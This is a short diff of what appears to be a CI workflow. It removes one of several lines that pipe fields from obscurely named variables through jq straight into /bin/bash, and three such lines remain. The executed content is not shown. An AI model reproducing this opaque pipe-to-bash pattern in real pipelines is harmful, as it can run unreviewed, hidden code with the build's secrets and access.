@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$mtgp61453" | jq -r .h4 | /bin/bash
           printf '%s' "$mautp2" | jq -r .bm84 | /bin/bash
           printf '%s' "$p9258" | jq -r .krc05 | /bin/bash
-          printf '%s' "$vnkl470" | jq -r .d132 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
